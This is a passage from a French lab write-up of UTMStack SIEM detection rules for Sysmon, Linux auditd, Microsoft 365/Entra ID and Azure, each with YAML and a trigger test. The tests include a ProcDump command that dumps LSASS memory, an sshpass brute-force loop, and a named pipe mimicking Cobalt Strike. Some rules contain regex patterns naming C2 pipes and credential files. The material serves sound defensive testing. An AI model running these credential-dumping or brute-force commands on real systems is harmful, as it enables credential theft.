```

**Test de déclenchement**

Depuis WIN11-AD-TESTS, en PowerShell admin (MDE interceptera et bloquera) :

```powershell
# Accès LSASS via l'API Windows — simuler le comportement d'un dumper
$proc = Get-Process lsass
$handle = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
# L'accès à la mémoire de lsass.exe via OpenProcess génère l'EID 10 Sysmon
```

En pratique, utiliser ProcDump de Sysinternals en environnement contrôlé isolé de MDE :

```cmd
procdump.exe -ma lsass.exe lsass.dmp
```

---

### S3 — Suspicious Named Pipe Created (EID 17)

Un named pipe avec un nom caractéristique d'un framework offensif a été créé. Les frameworks C2 comme Cobalt Strike, Metasploit et Mimikatz utilisent des named pipes spécifiques pour leurs communications.

Lors des tests, MDE a identifié automatiquement le pattern `\msagent_test` comme "Cobalt Strike named pipes" avec une alerte HIGH — illustration de la complémentarité entre EDR et SIEM.

**Technique MITRE :** T1559.001 — Named Pipes

```yaml
name: S3 - Suspicious Named Pipe Created
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Command and Control
technique: T1559.001 - Inter-Process Communication Named Pipes
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1559/001/
  - https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
description: 'Un named pipe avec un nom caractéristique d''un framework offensif a été créé (Sysmon EID 17). Les frameworks C2 comme Cobalt Strike utilisent des named pipes spécifiques pour leurs communications. Next Steps: 1. Identifier le processus créateur via log.data.Image. 2. Vérifier le nom exact du pipe via log.data.PipeName. 3. Rechercher d''autres activités suspectes depuis le même ProcessGuid. 4. Corréler avec les connexions réseau sortantes depuis la même machine. 5. Isoler la machine si un framework C2 est confirmé.'
where: |-
  equals("log.eventCode", 17) &&
  contains("log.channel", "Sysmon") &&
  equals("log.data.EventType", "CreatePipe") &&
  !contains("log.data.Image", "services.exe") &&
  regexMatch("log.data.PipeName", "(?i)\\\\(msagent_|postex_|status_|MSSE-|psexec|paexec|remcom|csexec|lsadump)")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

Depuis WIN11-AD-TESTS, en PowerShell admin :

```powershell
# Créer un named pipe avec un nom de pattern Cobalt Strike
$pipe = New-Object System.IO.Pipes.NamedPipeServerStream("msagent_test")
Start-Sleep -Seconds 2
$pipe.Dispose()
```

---

### S4 — Suspicious Access to NTDS or SAM Files (EID 11)

Un processus a créé ou modifié un fichier dans le répertoire NTDS ou dans les chemins des bases SAM/SYSTEM/SECURITY. La base `ntds.dit` contient tous les hashes de mots de passe du domaine.

Lors des tests, MDE a déclenché une alerte "Suspicious credential dump from NTDS.dit" sur la création d'un fichier vide nommé `ntds.dit` — même comportement de détection par nom de fichier.

**Note technique :** `New-Item` PowerShell ne génère pas d'EID 11 Sysmon. Il faut utiliser `cmd.exe` ou `echo` pour créer le fichier et déclencher l'event FileCreate.

**Technique MITRE :** T1003.003 — NTDS

```yaml
name: S4 - Suspicious Access to NTDS or SAM Files
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Credential Access
technique: T1003.003 - OS Credential Dumping NTDS
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1003/003/
  - https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
description: 'Un processus a créé ou modifié un fichier dans le répertoire NTDS ou accédé à la base SAM (Sysmon EID 11). La base NTDS.dit contient tous les hashes de mots de passe du domaine — une copie non autorisée permet l''extraction offline de tous les credentials. Next Steps: 1. Identifier le processus accédant à NTDS via log.data.Image. 2. Vérifier si le fichier créé est ntds.dit ou une copie. 3. Rechercher une tentative de Volume Shadow Copy dans la même fenêtre temporelle. 4. Isoler immédiatement le DC si un accès non autorisé est confirmé. 5. Réinitialiser le mot de passe krbtgt et tous les comptes privilégiés.'
where: |-
  equals("log.eventCode", 11) &&
  contains("log.channel", "Sysmon") &&
  (
    contains("log.data.TargetFilename", "\\NTDS\\") ||
    contains("log.data.TargetFilename", "ntds.dit") ||
    contains("log.data.TargetFilename", "\\SAM") ||
    contains("log.data.TargetFilename", "\\SYSTEM") ||
    contains("log.data.TargetFilename", "\\SECURITY")
  ) &&
  !contains("log.data.Image", "lsass.exe") &&
  !contains("log.data.Image", "System")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

Sur DC01-MAIN-SITE (contrôleur de domaine) depuis une invite de commande (`cmd.exe` — pas PowerShell) :

```cmd
echo test > C:\Temp\ntds.dit
del C:\Temp\ntds.dit
```

---

### S5 — Registry Run Key Persistence (EID 12/13)

Une valeur a été écrite ou supprimée dans une clé de démarrage automatique du registre. La règle couvre à la fois la création (EID 13 SetValue) et la suppression (EID 12 DeleteValue) — un attaquant qui nettoie sa persistance est également détecté.

**Technique MITRE :** T1547.001 — Registry Run Keys

```yaml
name: S5 - Registry Run Key Persistence
dataTypes:
  - wineventlog
impact:
  confidentiality: 2
  integrity: 3
  availability: 2
category: Persistence
technique: T1547.001 - Boot or Logon Autostart Execution Registry Run Keys
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1547/001/
  - https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
description: 'Une valeur a été écrite dans une clé de démarrage automatique du registre (Sysmon EID 13). Les clés Run et RunOnce sont les vecteurs de persistance les plus utilisés. Next Steps: 1. Identifier la valeur ajoutée via log.data.Details. 2. Vérifier le chemin de l''exécutable référencé — un chemin dans Temp ou AppData est très suspect. 3. Identifier le processus ayant effectué la modification via log.data.Image. 4. Supprimer la valeur si non autorisée. 5. Analyser l''exécutable référencé (hash, VirusTotal).'
where: |-
  oneOf("log.eventCode", [12, 13]) &&
  contains("log.channel", "Sysmon") &&
  regexMatch("log.data.TargetObject", "(?i)\\\\(Run|RunOnce)\\\\") &&
  !regexMatch("log.data.Image", "(?i)\\\\(services|svchost|msiexec|trustedinstaller|tiworker)[.]exe$") &&
  !contains("log.data.Image", "Windows Defender") &&
  !contains("log.data.Image", "UTMStack")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

Depuis WIN11-AD-TESTS en PowerShell :

```powershell
# Écrire une valeur dans Run (EID 13)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "test-s5" -Value "C:\Temp\test.exe"

# Supprimer la valeur (EID 12)
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "test-s5"
```

---

## Série L — Linux (auditd)

Les règles L utilisent les événements auditd Linux collectés par l'agent UTMStack sur les machines Linux du lab (`docker-services` — `10.100.1.10`, Ubuntu 26.04). Les fichiers YAML sont disponibles dans [`rules/linux/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules/linux).

### Découverte technique importante

Le moteur de corrélation UTMStack v11 n'évalue pas les champs syslog (`log.message`, `raw`) des événements Linux. Seuls les événements **auditd structurés** (`action`, `log.userauth.*`) sont traités par le pipeline de corrélation. Les tentatives de filtrage sur `log.message` ou `contains("raw", "...")` ne déclenchent pas, même si le texte recherché est bien présent dans le champ.

Cette limitation explique pourquoi les règles L utilisent les champs `action` et `log.userauth.*` plutôt que les messages textuels de `auth.log`.

---

### L1 — SSH Authentication Failure

Un échec d'authentification SSH a été détecté via les événements auditd (`USER_AUTH fail`).

**Technique MITRE :** T1110.001 — Password Guessing

```yaml
name: L1 - SSH Authentication Failure
dataTypes:
  - linux
impact:
  confidentiality: 2
  integrity: 2
  availability: 1
category: Authentication
technique: T1110.001 - Brute Force Password Guessing
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1110/001/
description: 'Un échec d''authentification SSH a été détecté sur un serveur Linux via les events auditd (USER_AUTH fail). Next Steps: 1. Identifier l''adresse IP source via log.userauth.addr. 2. Vérifier si plusieurs échecs proviennent de la même IP. 3. Bloquer l''IP source si le pattern est confirmé (fail2ban, CrowdSec). 4. Vérifier si une connexion réussie a suivi les échecs. 5. Auditer les comptes valides sur la machine cible.'
where: |-
  equals("action", "USER_AUTH") &&
  contains("log.userauth.result", "fail") &&
  regexMatch("log.userauth.exe", "(?i)sshd")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

Depuis n'importe quelle machine du lab, tenter une connexion SSH avec des credentials incorrects :

```bash
ssh utilisateur_inexistant@10.100.1.10
# ou plusieurs tentatives avec mauvais mot de passe
for i in $(seq 1 5); do sshpass -p "mauvais" ssh -o StrictHostKeyChecking=no demo@10.100.1.10; done
```

---

### L2 — Sudo Command Execution

Une commande a été exécutée avec des privilèges root via sudo.

**Technique MITRE :** T1548.003 — Sudo and Sudo Caching

```yaml
name: L2 - Sudo Command Execution
dataTypes:
  - linux
impact:
  confidentiality: 2
  integrity: 3
  availability: 2
category: Privilege Escalation
technique: T1548.003 - Abuse Elevation Control Mechanism Sudo and Sudo Caching
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1548/003/
description: 'Une commande a été exécutée avec des privilèges root via sudo sur un serveur Linux (auditd USER_AUTH success sudo). Next Steps: 1. Identifier le compte via log.userauth.acct. 2. Vérifier si la commande est autorisée. 3. Contrôler les connexions SSH récentes depuis le même compte. 4. Vérifier si le compte est dans sudoers de manière légitime. 5. Révoquer les droits sudo si non autorisé.'
where: |-
  equals("action", "USER_AUTH") &&
  contains("log.userauth.result", "success") &&
  regexMatch("log.userauth.exe", "(?i)sudo")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

Sur la machine `docker-services` (`10.100.1.10`), depuis une session SSH :

```bash
sudo whoami
# ou toute autre commande sudo
sudo systemctl status docker
```

---

## Série M — Microsoft 365 et Entra ID

Les règles M couvrent les événements Microsoft 365 collectés via l'API Office 365 Management Activity et indexés dans `v11-log-o365-*` avec `dataType = o365`. L'index contient les journaux d'audit unifiés : connexions Entra ID, opérations Exchange, SharePoint, Teams, et les events Purview DLP et MDE remontés via l'API O365.

### Découvertes techniques importantes

**`log.Workload` indexé en `text`** — les agrégations `terms` échouent silencieusement sur ce champ. Utiliser `contains()` et non `equals()`.

**`actionResult` paradoxal** — les events `UserLoginFailed` ont `actionResult = "Success"` car l'API a traité la requête correctement, même si l'authentification a échoué. C'est le champ `log.LogonError` qui indique le motif d'échec.

**`log.LogonError`** — présent uniquement sur certains events `UserLoginFailed` selon le motif d'échec fourni par Microsoft dans le payload. Absent des events de type reprocessing MFA (`ErrorNumber 9002341`) qui correspondent à des flux d'authentification intermédiaires MDE/Intune.

**`log.ExternalAccess`** — booléen natif dans OpenSearch. Utiliser `equals("log.ExternalAccess", true)` sans guillemets sur la valeur booléenne.

### Règles existantes en dépôt

Les cinq règles suivantes ont été créées lors des sessions initiales et sont disponibles dans [`rules/microsoft-365/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules/microsoft-365) :

| Fichier | Signal | Technique |
|---|---|---|
| `o365-entra-brute-force.yml` | `UserLoginFailed` + `log.LogonError = InvalidUserNameOrPassword` | T1110.001 |
| `o365-entra-password-spray.yml` | `UserLoginFailed` + `log.LogonError = InvalidUserNameOrPassword` sur comptes distincts | T1110.003 |
| `o365-impossible-travel.yml` | `UserLoggedIn` depuis deux pays distincts dans une fenêtre temporelle courte | T1078 |
| `o365-dlp-rule-match.yml` | `regexMatch("action", "(?i)dlprulematch")` — couvre `DLPRuleMatch` et `DlpRuleMatch` | T1567 |
| `o365-mde-malware-deleted.yml` | `FileDeleted` + Workload Endpoint (MDE) | T1070 |

### La boucle DLP — un anti-pattern de configuration documenté

Lors de la validation des règles M10 (Auto-Label) et M11 (DLP Rule Match), un phénomène de boucle d'alertes a été observé et mérite d'être expliqué en détail car il peut rapidement noyer un SOC sous des centaines d'alertes sans qu'une vraie menace soit présente.

**Le contexte :** les notifications d'alerte UTMStack sont configurées pour envoyer un email vers `demo.externe@gmail.com` — une adresse personnelle externe au tenant Microsoft 365. Quand une règle DLP se déclenche, UTMStack génère un email de notification vers cette adresse externe.

**La chaîne de causalité :**

1. Un email avec un document contenant des numéros AVS (numéro de sécurité sociale suisse) est envoyé vers `demo.externe@gmail.com`
2. La politique DLP `DLP-Protection-nLPD-demo` bloque l'email et génère un rapport d'incident
3. Ce rapport d'incident est lui-même envoyé par Exchange vers `demo.externe@gmail.com` — il contient en pièce jointe un fichier ZIP avec un CSV listant les données sensibles détectées, soit 480 occurrences de numéros AVS
4. La politique DLP scanne ce rapport et le bloque également — il contient les mêmes données sensibles
5. UTMStack génère une alerte sur ce nouveau blocage DLP et envoie une nouvelle notification vers `demo.externe@gmail.com`
6. Cette notification contient à nouveau des références aux données sensibles → retour à l'étape 4

La boucle tourne toutes les 5 minutes (cycle de réévaluation du moteur UTMStack), générant une paire d'alertes à chaque cycle. En parallèle, la règle M10 (AutoSensitivityLabelRuleMatch) s'active car Exchange tente d'appliquer automatiquement un label de confidentialité sur ces emails de rapport avant de les bloquer.

**Les acteurs visibles dans les alertes :**

- `notifications-utmstack@lan.local` — adresse d'expéditeur des notifications UTMStack
- `MipLabelsAgent` — service Exchange Online qui applique les labels automatiquement
- Des ID numériques (ex: `1153801140139386071`) — l'identifiant interne du service Exchange MipLabels

**La solution :** configurer les notifications d'alerte UTMStack vers une adresse interne au tenant (`demo@lan.local` plutôt qu'une adresse externe). Les emails internes ne sont pas soumis aux politiques DLP "externe" et la boucle disparaît immédiatement. Le changement se fait dans UTMStack → Settings → Notifications → Email destination.

**Ce que ça révèle sur la configuration DLP :** une politique DLP bien configurée exclut les emails de rapport d'incident de son propre scope. La boucle est un symptôme d'une politique qui s'applique à tous les emails sortants sans exception, y compris ses propres rapports. C'est un anti-pattern de configuration courant dans les environnements Purview nouvellement déployés.

---

### Protection contre le vol de session — Token Protection CA-04

Avant de documenter les règles de détection M3 et M5, il est utile de situer leur rôle dans l'architecture de défense globale face aux attaques AiTM (Adversary-in-the-Middle).

Dans une attaque AiTM, un proxy malveillant se positionne entre l'utilisateur et le service Microsoft. L'utilisateur complète le MFA normalement, mais le proxy intercepte le cookie de session post-authentification. L'attaquant utilise ensuite ce cookie depuis un autre appareil pour accéder aux ressources sans jamais connaître le mot de passe ni posséder le facteur MFA.

La politique d'accès conditionnel **CA-04 Token Protection** (Entra ID P1) lie cryptographiquement le token de session au TPM de l'appareil d'origine. Un cookie volé devient inutilisable depuis un appareil différent car la liaison TPM ne peut pas être reproduite. C'est une mesure préventive qui rend l'exploitation du token volé techniquement impossible, indépendamment du fait que le MFA a été complété ou non.

Les règles M3 (Impossible Travel) et M5 (MFA Required Interrupt) opèrent sur un plan complémentaire : elles détectent les signaux comportementaux de la tentative, indépendamment de son succès. M3 détecte une connexion depuis un pays géographiquement impossible après une connexion récente. M5 détecte l'interrupt MFA lui-même — visible dans les logs même quand CA-04 est en place et que le token volé a été rejeté. Cette trace est précieuse pour l'investigation post-incident : elle permet de reconstituer la timeline et d'identifier le vecteur d'attaque même si aucune donnée n'a été compromise.

---

### M3 — Impossible Travel (règle existante)

Connexion réussie depuis un pays géographiquement impossible compte tenu de la dernière connexion connue. Signal fort de compromission de compte ou d'utilisation d'un VPN d'un pays inhabituel.

**Fichier :** `o365-impossible-travel.yml` — voir dépôt.

**Test de déclenchement :** se connecter à `portal.office.com` via un VPN positionné dans un pays différent du pays habituel de connexion. La règle déclenche quand deux connexions réussies (`UserLoggedIn`) apparaissent depuis deux pays distincts dans la fenêtre `afterEvents` définie.

---

### M5 — MFA Required Interrupt on Sign-In

Une tentative de connexion Entra ID a été interrompue par une demande MFA (`LogonError UserStrongAuthClientAuthNRequiredInterrupt`, ErrorNumber 50074). Ce signal est normal lors d'une première connexion depuis un nouvel appareil, mais devient suspect associé à une IP externe inconnue ou un pays inhabituel. Dans un scénario AiTM, l'interrupt MFA reste visible dans les logs même si le proxy a relayé le token de session.

**Faux positifs documentés :** dans les environnements Intune, les appareils conformes peuvent générer cet event lors de connexions dont le statut de conformité n'a pas encore été propagé. Le champ `log.DeviceProperties` montre `IsCompliant = False` même pour un appareil enregistré et conforme dans Intune. Ce décalage est inhérent à la synchronisation asynchrone entre Intune et Entra ID au moment de l'authentification — le statut réel est bien conforme, mais l'event est loggé avant que la propagation soit complète.

**Technique MITRE :** T1078.004 — Valid Accounts: Cloud Accounts

```yaml
name: Entra ID - MFA Required Interrupt on Sign-In
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Credential Access
technique: T1078.004 - Valid Accounts Cloud Accounts
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1078/004/
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-sign-ins
description: 'Une tentative de connexion Entra ID a été interrompue par une demande MFA (LogonError UserStrongAuthClientAuthNRequiredInterrupt, ErrorNumber 50074). Ce signal est normal lors d''une première connexion depuis un nouvel appareil, mais devient suspect s''il est associé à une IP externe inconnue ou à un pays inhabituel. Dans un scénario AiTM, le proxy malveillant relaie le token de session après que l''utilisateur a complété le MFA — l''interrupt lui-même reste visible dans les logs. Next Steps: 1. Vérifier si l''IP source (origin.ip) est habituelle pour cet utilisateur. 2. Contrôler le pays d''origine via origin.geolocation.countryCode. 3. Vérifier si une connexion réussie (UserLoggedIn) a suivi dans la même fenêtre temporelle depuis la même IP. 4. Révoquer les sessions actives via Entra ID si compromission suspectée. 5. Corréler avec la règle Entra ID - Impossible Travel si le pays est inhabituel.'
where: |-
  equals("action", "UserLoginFailed") &&
  contains("log.Workload", "AzureActiveDirectory") &&
  equals("log.LogonError", "UserStrongAuthClientAuthNRequiredInterrupt")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** ouvrir une session de navigation privée et se connecter à `portal.office.com`. Sur un appareil non enregistré dans Intune ou lors d'une première connexion depuis un nouveau navigateur, Entra ID demande le MFA. Fermer la fenêtre avant de valider le MFA — l'event `UserLoginFailed` avec `LogonError = UserStrongAuthClientAuthNRequiredInterrupt` est généré même si la fenêtre est fermée sans validation.

---

### M6 — Member Added to Group by User

Un compte utilisateur a été ajouté à un groupe Entra ID par un utilisateur humain. Les ajouts automatiques par des ServicePrincipals Microsoft (Microsoft Approval Management, Entra Connect) sont exclus.

**Pourquoi exclure les ServicePrincipals mais pas les comptes de service ?** Lors des tests, l'unique event `Add member to group.` présent en base était l'ajout automatique de `ch11-test` au groupe "Tous les utilisateurs" par `Microsoft Approval Management` — un service Microsoft interne qui gère les flux d'approbation lors de la synchronisation Entra Connect. Le filtre `!contains("origin.user", "ServicePrincipal_")` élimine ces ajouts automatiques tout en conservant les ajouts effectués par des comptes de service humainement contrôlés dont l'UPN ne commence pas par ce préfixe.

**Technique MITRE :** T1098.003 — Account Manipulation: Additional Cloud Roles

```yaml
name: Entra ID - Member Added to Group by User
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 3
  availability: 1
category: Privilege Escalation
technique: T1098.003 - Account Manipulation Additional Cloud Roles
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1098/003/
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-audit-logs
description: 'Un compte utilisateur a été ajouté à un groupe Entra ID par un utilisateur humain (Add member to group., Workload AzureActiveDirectory). Les ajouts automatiques par des ServicePrincipals Microsoft (Microsoft Approval Management, Entra Connect) sont exclus via le filtre sur origin.user. Un ajout non autorisé à un groupe de sécurité ou M365 peut conférer des droits d''accès à des ressources sensibles. Next Steps: 1. Identifier le membre ajouté via log.ObjectId. 2. Identifier le groupe cible via log.ModifiedProperties (champ Group.DisplayName). 3. Vérifier si l''acteur (origin.user) est autorisé à modifier ce groupe. 4. Contrôler les droits associés au groupe cible. 5. Retirer le membre si l''ajout n''est pas justifié.'
where: |-
  equals("action", "Add member to group.") &&
  contains("log.Workload", "AzureActiveDirectory") &&
  !contains("origin.user", "ServicePrincipal_")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** dans le portail Entra ID → Groupes → sélectionner un groupe de sécurité existant → Membres → Ajouter des membres → sélectionner un utilisateur de test. L'alerte contient `log.ObjectId` (UPN du membre ajouté) et `log.ModifiedProperties` avec `Group.DisplayName` (nom du groupe cible).

---

### M7 — User Account Created Outside Sync Process

Un compte utilisateur a été créé directement dans Entra ID, hors du processus de synchronisation Entra Connect. La règle exclut les créations via `ConnectSyncProvisioning` car elles représentent le flux normal de synchronisation AD→Entra.

**Contexte de l'exclusion :** dans ce tenant, tous les comptes passent par Entra Connect (gest-srv (serveur membre du domaine) héberge le connecteur). L'unique event `Add user.` présent en base avant le test était la création de `ch11-test@lan.local` par `ConnectSyncProvisioning_GEST-SRV_...` — un ServicePrincipal Entra Connect. Sans l'exclusion, chaque nouvel utilisateur créé dans l'AD on-premise génèrerait une alerte lors de sa synchronisation vers Entra ID.

**Technique MITRE :** T1136.003 — Create Account: Cloud Account

```yaml
name: Entra ID - User Account Created Outside Sync Process
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 3
  availability: 1
category: Persistence
technique: T1136.003 - Create Account Cloud Account
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1136/003/
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-audit-logs
description: 'Un compte utilisateur a été créé directement dans Entra ID, hors du processus de synchronisation Entra Connect (Add user., Workload AzureActiveDirectory). Les créations via Entra Connect (ConnectSyncProvisioning) sont exclues car elles représentent le flux normal de synchronisation AD→Entra. La création manuelle d''un compte cloud contourne les contrôles IAM on-premise et peut indiquer une tentative de persistance post-compromission. Next Steps: 1. Identifier le compte créé via log.ObjectId. 2. Vérifier si le compte est autorisé dans le processus RH/IT. 3. Contrôler l''acteur via origin.user. 4. Vérifier si le compte a reçu des droits ou licences après création. 5. Désactiver le compte si non autorisé et investiguer le vecteur initial.'
where: |-
  equals("action", "Add user.") &&
  contains("log.Workload", "AzureActiveDirectory") &&
  !contains("origin.user", "ConnectSyncProvisioning")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** dans le portail Entra ID → Utilisateurs → Nouvel utilisateur → Créer un utilisateur → saisir un UPN cloud (`test-m7@lan.local`). Ce compte est créé directement dans Entra ID sans passer par l'AD on-premise — `origin.user` sera l'administrateur humain, pas `ConnectSyncProvisioning`. Supprimer le compte après validation.

---

### M10 — Purview Sensitive Data Auto-Label Rule Match

Une règle d'étiquetage automatique Microsoft Purview a détecté des données sensibles et a appliqué un label de confidentialité en mode Enforce. Cet event (`AutoSensitivityLabelRuleMatch`, Workload Exchange, RecordType 75) est généré côté serveur Exchange Online — pas par le client Outlook.

**Pourquoi Enforce et pas Simulate ?** En mode Simulate, Exchange scanne les emails et génère des events `AutoSensitivityLabelRuleMatch` à titre informatif sans appliquer le label. En mode Enforce, le label est appliqué automatiquement. La règle ne filtre que les events Enforce car les events Simulate ne représentent pas une action effective sur les données.

**Technique MITRE :** T1567 — Exfiltration Over Web Service

```yaml
name: Purview - Sensitive Data Auto-Label Rule Match
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Data Loss Prevention
technique: T1567 - Exfiltration Over Web Service
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1567/
  - https://learn.microsoft.com/en-us/purview/apply-sensitivity-label-automatically
  - https://learn.microsoft.com/en-us/purview/dlp-learn-about-dlp
description: 'Une règle d''étiquetage automatique Microsoft Purview a détecté des données sensibles et a appliqué un label de confidentialité (AutoSensitivityLabelRuleMatch, mode Enforce). Cet event indique que des données protégées circulent dans Exchange ou SharePoint. Les emails de notification DLP internes sont exclus pour éviter les boucles d''alertes. Next Steps: 1. Identifier la politique déclenchée via log.PolicyName et la règle via log.ExecutionRuleName. 2. Identifier le label appliqué via log.LabelName. 3. Vérifier si le destinataire ou le chemin de partage est approprié pour ce niveau de confidentialité. 4. Corréler avec les events DLPRuleMatch si une politique DLP couvre les mêmes données. 5. Vérifier si l''expéditeur est autorisé à manipuler des données de ce niveau de sensibilité.'
where: |-
  equals("action", "AutoSensitivityLabelRuleMatch") &&
  contains("log.RuleMode", "Enforce") &&
  !contains("origin.user", "notifications-") &&
  !contains("origin.user", "MipLabelsAgent")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** envoyer depuis `demo@lan.local` vers une adresse externe un email contenant un document avec des données sensibles couvertes par la politique d'auto-labeling (dans ce lab : un document Word contenant un numéro AVS). Exchange Online applique automatiquement le label `4 — RH-Confidentiel` et génère l'event. L'alerte contient `log.PolicyName`, `log.ExecutionRuleName`, `log.LabelName` et `log.ExchangeMetaData`.

**Voir section "La boucle DLP" ci-dessus** pour comprendre pourquoi les exclusions `!contains("origin.user", "notifications-")` et `!contains("origin.user", "MipLabelsAgent")` sont indispensables.

---

### M2 — OAuth Application Consent Granted

Un utilisateur ou un administrateur a accordé son consentement à une application OAuth tierce dans Entra ID. Les attaques par consentement OAuth malveillant (Consent Phishing) consistent à faire approuver une application qui dispose de droits étendus sans vol de mot de passe.

**Technique MITRE :** T1550.001 — Use Alternate Authentication Material: Application Access Token

```yaml
name: Entra ID - OAuth Application Consent Granted
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Persistence
technique: T1550.001 - Use Alternate Authentication Material Application Access Token
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1550/001/
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-audit-logs
  - https://learn.microsoft.com/en-us/entra/identity/enterprise-apps/consent-and-permissions-overview
description: 'Un utilisateur ou un administrateur a accordé son consentement à une application OAuth tierce dans Entra ID (Consent to application.). Les attaques par consentement OAuth malveillant consistent à faire approuver une application qui dispose de droits étendus (lecture emails, accès OneDrive, envoi au nom de l''utilisateur) sans vol de mot de passe. Ce vecteur permet un accès persistant même après réinitialisation du mot de passe. Next Steps: 1. Identifier l''application via log.ObjectId. 2. Vérifier les permissions accordées dans Entra ID (Applications d''entreprise → Autorisations). 3. Contrôler si l''application est approuvée par l''IT. 4. Révoquer le consentement si l''application est suspecte. 5. Vérifier les activités post-consentement depuis l''AppId (accès Exchange, SharePoint).'
where: |-
  equals("action", "Consent to application.") &&
  contains("log.Workload", "AzureActiveDirectory")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** dans le portail Entra ID → Applications d'entreprise → sélectionner une application avec des autorisations configurées (ex: UTMStack O365 Agent) → Sécurité → Autorisations → **Accorder un consentement d'administrateur pour [tenant]**. Confirmer dans la boîte de dialogue. L'alerte contient `log.ObjectId` (AppId de l'application), `log.ModifiedProperties` avec les scopes accordés (`ConsentContext.IsAdminConsent`, `ConsentAction.Permissions`).

---

## Série A — Azure Activity Log

Les règles A couvrent les événements Azure Activity Log collectés via l'Event Hub et indexés dans `v11-log-azure-*` avec `dataType = azure`. Deux structures coexistent dans l'index : Activity Log (`log.operationName`, en majuscules) et Event Grid (`log.data.operationName`, en casse mixte). Les règles A ciblent principalement Activity Log. Les fichiers YAML sont disponibles dans [`rules/azure/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules/azure).

### Prérequis infrastructure — Event Hub SKU Standard

**Event Hub SKU Standard requis** — le SKU Essentiel (anciennement Basic) limite à un seul Consumer Group (`$Default`). Lorsque UTMStack et Azure Monitor lisent simultanément depuis `$Default`, les messages sont consommés en compétition : certains events arrivent dans OpenSearch uniquement avec le champ `raw` brut, sans aucun champ `log.*` extrait. Le moteur de corrélation UTMStack ne peut pas évaluer `raw` — les règles A ne déclenchent pas sur ces events mal parsés.

Ce comportement a été observé en pratique : les events du 11 août étaient correctement mappés (`log.operationName` présent dans `_source`), ceux du 12 août arrivaient uniquement avec `raw`. L'accès concurrent au Consumer Group `$Default` par plusieurs services Azure au moment d'une activité intense sur le portail était la cause.

La solution est de passer l'espace de noms Event Hub en **SKU Standard** et de créer un Consumer Group dédié `utmstack` dans l'instance Event Hub. UTMStack est ensuite reconfiguré pour utiliser ce Consumer Group. Avec un Consumer Group exclusif, UTMStack lit tous les messages sans compétition et le parsing est systématiquement correct.

**Diagnostic setting** — toutes les catégories doivent être activées dans le paramètre de diagnostic de la subscription Azure : Administrative, Security, ServiceHealth, Alert, Recommendation, Policy, Autoscale, ResourceHealth.

### Particularités du moteur

`log.operationName` est indexé en `text` et contient les opérations en **MAJUSCULES**. Utiliser `contains()` pour les filtres. Le champ `log.resultType` a trois valeurs possibles par opération : `Start` (début de l'opération), `Accept` (acceptée par Azure), `Success` (terminée avec succès). Le filtre `contains("log.resultType", "Success")` permet de n'alerter que sur les opérations abouties.

---

### A1 — Storage Account Keys or SAS Token Listed

Une opération de listing des clés d'accès ou de génération de token SAS d'un compte de stockage Azure a été détectée. Les clés de stockage donnent un accès complet aux données — leur listing est un signal de reconnaissance ou d'exfiltration de credentials.

**Volume d'alertes élevé attendu** — dans ce lab, les services automatiques Azure (Network Watcher, Event Grid, UTMStack lui-même pour lire les checkpoints du Consumer Group) listent régulièrement les clés pour leurs opérations internes. Ces accès se font via des ServicePrincipals avec des rôles explicites (`Reader and Data Access`, `Azure EventGrid Service BuiltIn Role`). La tentation d'exclure les ServicePrincipals est forte — mais un ServicePrincipal compromis peut effectuer exactement les mêmes opérations avec les mêmes rôles qu'un ServicePrincipal légitime. Les exclusions sur `principalType` ne sont donc pas appliquées. L'analyste SOC contextualise via `origin.ip` (une IP Microsoft interne connue est différente d'une IP externe inconnue) et `log.identity.authorization.evidence.role`.

**Technique MITRE :** T1552.005 — Unsecured Credentials: Cloud Instance Metadata API

```yaml
name: Azure - Storage Account Keys or SAS Token Listed
dataTypes:
  - azure
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Credential Access
technique: T1552.005 - Unsecured Credentials Cloud Instance Metadata API
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1552/005/
  - https://learn.microsoft.com/en-us/azure/storage/common/storage-account-keys-manage
